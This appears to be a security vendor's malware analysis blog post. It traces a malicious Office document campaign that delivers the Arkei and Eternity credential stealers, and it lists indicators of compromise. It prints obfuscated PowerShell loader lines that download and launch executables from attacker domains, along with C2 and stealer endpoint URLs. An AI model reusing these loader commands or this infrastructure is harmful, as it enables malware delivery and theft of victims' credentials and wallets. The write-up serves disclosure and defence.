<div>
<img alt="" height="1" src="https://dc.ads.linkedin.com/collect/?pid=436170&amp;fmt=gif" width="1"/>
<p>Some time ago, we discovered an interesting campaign distributing malicious documents. Which used the download chain as well as legitimate payload hosting services. In this report, we will show the technical side of this campaign as well as provide additional indicators.</p>
<figure class="wp-block-table"><table><tbody><tr><td>File Type </td><td>Office Open XML Document</td></tr><tr><td>SHA256</td><td><a href="https://labs.inquest.net/dfi/sha256/b3920fe11f1dcaf5a7f4cb8a37bed2dd6a8638c5f8a4312d4c07d11f7d0e62da">b3920fe11f1dcaf5a7f4cb8a37bed2dd6a8638c5f8a4312d4c07d11f7d0e62da </a></td></tr></tbody></table></figure>
<figure class="aligncenter size-full"><img alt="" class="wp-image-1675" src="https://inquest.net/sites/default/files/inline-images/1.jpeg" style="max-width:80%;height:auto;width:auto;"/><figcaption>Image 1: Coercive graphical lure</figcaption></figure>
<figure class="aligncenter size-full"><img alt="" class="wp-image-1676" src="https://inquest.net/sites/default/files/inline-images/2_3.png" style="max-width:80%;height:auto;width:auto;"/><figcaption>Image 2: Low AV detection</figcaption></figure>
<p>A check on the VirusTotal service showed a very superficial detection. If we unpack the document, then we can see a lot of information that the XML files contain. We see how the .xml file “settings.xml.rels” abuses the element &lt;Relationship&gt; to download the next payload stage. Using the following url “hxxps://github[.]com/Collabsss/dotm/raw/main/tj3wqx.dotm”</p>
<figure class="aligncenter size-full"><img alt="" class="wp-image-1677" src="https://inquest.net/sites/default/files/inline-images/3_1.png" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 3: XML file loads payload</figcaption></figure>
<figure class="wp-block-table"><table><tbody><tr><td>File Type </td><td>Office Open XML Document</td></tr><tr><td>SHA256</td><td><a href="https://labs.inquest.net/dfi/sha256/b9a1ac0335226386029bb3b6f9f3b9114bde55c7ea9f4fdcdccc02593208bdfd">b9a1ac0335226386029bb3b6f9f3b9114bde55c7ea9f4fdcdccc02593208bdfd</a></td></tr></tbody></table></figure>
<p>The document of the second stage contains macros and InQuest Labs is great at extracting the macro to understand how it works. </p>
<figure class="aligncenter size-full"><img alt="" class="wp-image-1678" src="https://inquest.net/sites/default/files/inline-images/4_2.png" style="max-width:80%;height:auto;width:auto;"/><figcaption>Image 4: Malicious second stage macro</figcaption></figure>
<p>The macro converts the URL and then loads the executable into the directory "C:\\Users\\Public\\servicehomework.exe". Once downloaded, the executable file is launched.</p>
<figure class="wp-block-table"><table><tbody><tr><td>File Type </td><td>x64 Executable.</td></tr><tr><td>SHA256</td><td><a href="https://www.virustotal.com/gui/file/7093aba8ae03275caab7372a7d56172df1716120d477dc276ee9f0b08816bd0c">7093aba8ae03275caab7372a7d56172df1716120d477dc276ee9f0b08816bd0c</a></td></tr></tbody></table></figure>
<p>The functionality of this executable is quite simple. It executes consecutive PowerShell scripts that are Base64 encoded; between network requests, the program goes to sleep for 5 minutes</p>
<p></p>
<figure class="aligncenter size-large"><img alt="" class="wp-image-1680" src="https://inquest.net/sites/default/files/styles/large/public/inline-images/5_3.png?itok=TI9MV47v" style="max-width:80%;height:auto;width:auto;"/><figcaption>Image 5: Functionality</figcaption></figure>
<p>This executable has two main tasks: Downloads a PDF file from hxxp://rwwmefkauiaa[.]ru/document1916t.pdf and opens it. This is done to distract the user from further payload execution. </p>
<p>With this obfuscated script, a PDF file is loaded.</p>
<code>&amp;("{0}{1}{3}{2}"-f'In',("{2}{1}{3}{0}"-f'e','e','vok',("{1}{0}"-f("{1}{0}"-f'bR','We'),'-')),'st','que')("{3}{2}{0}{1}{5}{7}{4}{6}"-f("{1}{0}"-f'ka','mef'),("{0}{1}"-f'uia','a.'),("{0}{1}"-f'/',("{0}{1}"-f'/r','ww')),("{1}{0}"-f'p:','htt'),("{0}{1}{2}"-f'ent','19','1'),("{0}{1}"-f'ru',("{1}{0}"-f'doc','/')),("{0}{1}"-f'6',("{0}{1}"-f't',("{0}{1}"-f'.pd','f'))),'um')-OutFile"$env:userprofile/Documents/document01.pdf";.("{0}{1}"-f'St','art')"$env:userprofile/Documents/document01.pdf"</code>
<p>Executing a command to launch a PDF file.</p>
<code>C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe" "C:\Users\Admin\Documents\document01.pdf</code>
<figure class="aligncenter size-full"><img alt="" class="wp-image-1681" src="https://inquest.net/sites/default/files/inline-images/6_1.png" style="max-width:80%;height:auto;width:auto;"/><figcaption>Image 7:<a href="https://www.virustotal.com/gui/file/21bee7d6fd38d4c66deb99404cb48c10677ebfb4bb62843fdac97494426f51ea"> Downloaded PDF</a>
 21bee7d6fd38d4c66deb99404cb48c10677ebfb4bb62843fdac97494426f51ea </figcaption></figure>
<p><a href="http://rwwmefkauiaa.ru/document1916t.pdf*"></a></p>
<p>The following obfuscated script downloads an executable from this address.</p>
<p>hxxp://rwwmefkauiaa[.]ru/u84ls.exe</p>
<code>.("{2}{4}{1}{3}{0}"-f("{0}{2}{1}"-f("{0}{1}"-f'ebR','e'),'t',("{0}{1}"-f'que','s')),'e-','In','W','vok')("{1}{3}{5}{0}{2}{4}{6}"-f("{0}{1}{2}"-f'hx',("{1}{0}"-f'a',("{0}{1}"-f'.ru','/')),'0hn'),'htt',("{0}{1}"-f("{0}{1}"-f("{1}{0}"-f'ee1','g'),'8'),'y'),("{0}{2}{1}{3}"-f'p:/',("{1}{0}"-f'n',("{1}{0}"-f("{1}{0}"-f'p',("{1}{0}"-f'w','ugd')),'c')),'/','y'),'3z','kg',("{0}{1}"-f'.e','xe'))-OutFile"$env:appdata/pkdzb.exe"</code>
<p>hxxp://rwwmefkauiaa[.]ru/builded1916t.exe</p>
<code>&amp;("{4}{2}{1}{3}{0}"-f't',("{1}{0}{2}"-f'ebR',("{0}{1}"-f'oke','-W'),'eq'),'v','ues','In')("{2}{0}{1}{7}{6}{4}{3}{5}"-f("{1}{0}"-f'//r','tp:'),("{0}{2}{1}"-f'wwm',("{1}{0}"-f'au','fk'),'e'),'ht',("{0}{2}{1}"-f'16','x','t.e'),'9','e',("{2}{1}{0}"-f'd1',("{0}{1}"-f'il','de'),("{0}{1}"-f("{1}{0}"-f'u/b','a.r'),'u')),'ia')-OutFile"$env:appdata/Microsoft/AdobeService.exe";&amp;("{2}{1}{0}"-f'ss',("{0}{1}{2}"-f'ar',("{0}{1}"-f't',("{1}{0}"-f'Pro','-')),'ce'),'St')-Filepath"$env:appdata/Microsoft/AdobeService.exe"
</code>
<figure class="wp-block-table"><table><tbody><tr><td>File Type </td><td>x32 Executable</td></tr><tr><td>SHA256</td><td><a href="https://www.virustotal.com/gui/file/27223530f9da259a9f2318b525399a30f5656ca4d2951d76af8039484d8f3e74">27223530f9da259a9f2318b525399a30f5656ca4d2951d76af8039484d8f3e74</a></td></tr><tr><td>Malware Family</td><td>Arkei Stealer</td></tr></tbody></table><figcaption>Sample 1</figcaption></figure>
<p>The main task of “Arkei Stealer” is to collect as much account data as possible from the victim's computer. Logins, passwords, autofill forms, cryptocurrency wallets, and also geolocation. After collecting the data, they are sent to a remote server and the program deletes itself.</p>
<p>С2 Address: hxxp://162.33.179[.]235/gatero0m.php</p>
<figure class="wp-block-table"><table><tbody><tr><td>File Type </td><td>x32 .NET Assembly Executable </td></tr><tr><td>Sha 256 </td><td><a href="https://www.virustotal.com/gui/file/beedb7cc465933bc983dab4c41f8464d985ec15680f60dec4f27e0a96e88939d">beedb7cc465933bc983dab4c41f8464d985ec15680f60dec4f27e0a96e88939d</a></td></tr><tr><td>Malware Family</td><td>Eternity Stealer</td></tr></tbody></table><figcaption>Sample 2</figcaption></figure>
<p>Like the previous stealer, it collects all possible information about the victim, converts it into a ZIP archive and sends it to a server located in the Onion network. Eternity Stealer also creates a special file in which it writes basic information about the victim. As well as screenshots and browser data (Logins, passwords, autofill forms) in a separate SQL file.</p>
<figure class="aligncenter size-full"><img alt="" class="wp-image-1683" src="https://inquest.net/sites/default/files/inline-images/7_1.png" style="max-width:80%;height:auto;width:auto;"/><figcaption>Image 8: Exfil report</figcaption></figure>
<figure class="aligncenter size-full"><img alt="" class="wp-image-1684" src="https://inquest.net/sites/default/files/inline-images/8_0.png" style="max-width:80%;height:auto;width:auto;"/><figcaption>Image 9: PCAP sending data</figcaption></figure>
<p>This is a rather unusual technique for launching two final payloads. However, this is very often used in recent times. Remote access programs and spyware are sold today as a service. This makes the threat landscape that organizations and users face today even more dangerous.</p>
<h2>IOCs</h2>
<h3>
Stage 1 Maldocs</h3>
<p><a href="https://labs.inquest.net/dfi/sha256/b3920fe11f1dcaf5a7f4cb8a37bed2dd6a8638c5f8a4312d4c07d11f7d0e62da">b3920fe11f1dcaf5a7f4cb8a37bed2dd6a8638c5f8a4312d4c07d11f7d0e62da</a>
<a href="https://labs.inquest.net/dfi/sha256/08cd999cee6f248e0847c012e68476ca38f280855e3b2406189ff9eca49087be">08cd999cee6f248e0847c012e68476ca38f280855e3b2406189ff9eca49087be</a>
<a href="https://labs.inquest.net/dfi/sha256/21354be825c9532dd39072e8a67ed935ce4cfc4f5077bd65f1118adf86c4a0d6">21354be825c9532dd39072e8a67ed935ce4cfc4f5077bd65f1118adf86c4a0d6</a>
<a href="http://0f1169276cf30b4514a043e9b3587c073e20efa186d26974490a54733288825d">0f1169276cf30b4514a043e9b3587c073e20efa186d26974490a54733288825d</a></p>
<h3>Stage 2 Download (InQuest Labs IOC Lookup)</h3>
<p><a href="https://labs.inquest.net/dfi/search/ioc/url/http%3A%2F%2Fckrddvcveumq.ru%2Fv7dgre.dotm##eyJyZXN1bHRzIjpbIn4iLCJmaXJzdFNlZW4iLDEsIiIsW11dfQ==">hxxp://ckrddvcveumq[.]ru/v7dgre.dotm</a>
<a href="https://labs.inquest.net/dfi/search/ioc/url/https%3A%2F%2Fwww.dropbox.com%2Fs%2Fe6yaipmzb8ik7dm%2Fxcl2ba.dotm%3Fdl%3D1##eyJyZXN1bHRzIjpbIn4iLCJmaXJzdFNlZW4iLDEsIiIsW11dfQ==">hxxps://www.dropbox[.]com/s/e6yaipmzb8ik7dm/xcl2ba.dotm?dl=1</a>
<a href="https://labs.inquest.net/dfi/search/ioc/url/http%3A%2F%2Fzyzkikpfewuf.ru%2Fhour84a6d9k.dotm##eyJyZXN1bHRzIjpbIn4iLCJmaXJzdFNlZW4iLDEsIiIsW11dfQ==">hxxp://zyzkikpfewuf[.]ru/hour84a6d9k.dotm</a></p>
<p>Stage 2 exe downloader
<a href="https://www.virustotal.com/gui/file/7093aba8ae03275caab7372a7d56172df1716120d477dc276ee9f0b08816bd0c">7093aba8ae03275caab7372a7d56172df1716120d477dc276ee9f0b08816bd0c</a></p>
<p>hxxp://rwwmefkauiaa[.]ru/document1916t.pdf
hxxp://cugdwpnykghx[.]ru/bq979g5dfweq.exe
hxxp://cugdwpnykghx[.]ru/a0hngee18y3z.exe
hxxp://rwwmefkauiaa[.]ru/u84ls.exe
hxxp://rwwmefkauiaa[.]ru/builded1916t.exe</p>
<p></p>
<h3>Stage 3</h3>
<p><a href="https://www.virustotal.com/gui/file/27223530f9da259a9f2318b525399a30f5656ca4d2951d76af8039484d8f3e74">27223530f9da259a9f2318b525399a30f5656ca4d2951d76af8039484d8f3e74 </a>- Arkei Stealer
<a href="https://www.virustotal.com/gui/file/beedb7cc465933bc983dab4c41f8464d985ec15680f60dec4f27e0a96e88939d">beedb7cc465933bc983dab4c41f8464d985ec15680f60dec4f27e0a96e88939d </a>- Eternity Stealer
</p>
<h3>C2</h3>
<p>hxxp://lightnogu5owjjllyo4tj2sfos6fchnmcidlgo6c7e6fz2hgryhfhoyd.onion/stealer/918119271?pwds=0&amp;cards=0&amp;wlts=0&amp;files=0&amp;user=dXNlcg==&amp;comp=aG9veWVxaXhsenk=&amp;ip=OTUuMjExLjE5MC4xOTk=&amp;country=TmV0aGVybGFuZHMgKE5MKQ==&amp;city=SGFhcmxlbQ==&amp;tag=32748</p>
<p>hxxp://162.33.179[.]235/gatero0m.php</p>
<p>Additional indicators potentially related to this campaign:</p>
<p>aztkiryhetxx[.]ru
ckrddvcveumq[.]ru
cugdwpnykghx[.]ru
dvizhdom[.]ru
dwrfqitgvmqn[.]ru
rhjebiuujydv[.]ru
rwwmefkauiaa[.]ru
sanlygeljek[.]ru
sinelnikovd[.]ru
wzqyuwtdxyee[.]ru
zpuxmwmwdxxk[.]ru
zyzkikpfewuf[.]ru
hxxp://zyzkikpfewuf[.]ru/hour84a6d9k.dotm
hxxp://zyzkikpfewuf[.]ru/hour84a6d9k.exe
hxxp://zyzkikpfewuf[.]ru/esttpnhsmb.exe
hxxp://zyzkikpfewuf[.]ru/eSttPnHsmB.exe
hxxp://zyzkikpfewuf[.]ru/XpqA02Df.exe
hxxp://zyzkikpfewuf[.]ru/xpqa02df.exe
hxxp://ckrddvcveumq[.]ru/
hxxps://ckrddvcveumq[.]ru/
hxxp://ckrddvcveumq[.]ru/v7dgre.dotm
hxxp://ckrddvcveumq[.]ru/p73tzehj.exe
hxxp://ckrddvcveumq[.]ru/p73tzehj.exe/
hxxp://cugdwpnykghx[.]ru/
hxxps://cugdwpnykghx[.]ru/
hxxp://cugdwpnykghx[.]ru/a0hngee18y3z.exe
hxxp://cugdwpnykghx[.]ru/0530cd.dat
hxxp://cugdwpnykghx[.]ru/ffe0a6.dat.dat
hxxp://cugdwpnykghx[.]ru/fd51a0.dat
hxxp://rwwmefkauiaa[.]ru/
hxxp://rwwmefkauiaa[.]ru/az9vu.exe
hxxps://rwwmefkauiaa[.]ru/
hxxp://rwwmefkauiaa[.]ru/builded1916t.exe
hxxp://rwwmefkauiaa[.]ru/u84ls.exe
hxxp://rwwmefkauiaa[.]ru/fyi82dk.pdf
hxxp://rwwmefkauiaa[.]ru/vdl4t.exe</p>
<p>Pivoting on the overlooked anchor (XMP ID)</p>
<p><a href="https://labs.inquest.net/dfi/search/ioc/xmpid/xmp.iid%3Ad68e8829-30b4-40ef-ba8e-2b22843a29c6##eyJyZXN1bHRzIjpbIn4iLCJmaXJzdFNlZW4iLDEsIiIsW11dfQ==">https://labs.inquest.net/dfi/search/ioc/xmpid/xmp.iid%3Ad68e8829-30b4-40ef-ba8e-2b22843a29c6##eyJyZXN1bHRzIjpbIn4iLCJmaXJzdFNlZW4iLDEsIiIsW11dfQ==</a>
Kung-fu IOC extraction supported by the InQuest Labs <a href="https://github.com/inquest/python-inquestlabs">CLI Library</a>.
</p>
$ for h in `inquest_labs dfi search xmpid xmp.did:eabe445b-730a-4965-9015-880d3f27fe09 | jq -r ".[].sha256"`;
do
 inquest_labs dfi attributes $h --filter=url | jq -r ".[].value";
done | sort -u | grep -v gimp.org | sed -E 's/http/hxxp/g'
hxxp://ckrddvcveumq.ru/v7dgre.dotm
hxxps://github.com/Collabsss/dotm/raw/main/tj3wqx.dotm
hxxps://www.dropbox.com/s/e6yaipmzb8ik7dm/xcl2ba.dotm?dl=1
hxxp://zyzkikpfewuf.ru/hour84a6d9k.dotm
<p></p>
<h5 class="mb-4">Tags</h5>
<h2 class="font-weight-bold mb-4">Get The InQuest Insider</h2>
<p>Find us on <a href="https://twitter.com/inquest">Twitter</a> for frequent updates, follow our <a href="https://inquest.net/blog">Blog</a> for bi-weekly technical write-ups, or subscribe here to receive our monthly newsletter, The InQuest Insider. We curate and provide you with the latest news stories, field notes about innovative malware, novel research / analysis / threat hunting tools, security tips and more.</p>
<a class="text-dark d-block border border-grey p-4 text-center" href="https://inquest.net/blog">
<h3 class="p-3 font-weight-bold">Other Blog Articles</h3>
<img alt="Forward Arrow Icon" class="p-3" src="https://inquest.net/themes/custom/inquest_salted_stone/assets/img/forward.svg" style="max-width:80%;height:auto;width:auto;"/>
</a>
<a class="text-dark d-block border border-grey p-4 text-center" href="https://inquest.net/contact-us">
<h3 class="p-3 font-weight-bold">Schedule a Demo</h3>
<img alt="Forward Arrow Icon" class="p-3" src="https://inquest.net/themes/custom/inquest_salted_stone/assets/img/forward.svg" style="max-width:80%;height:auto;width:auto;"/>
</a>
</div>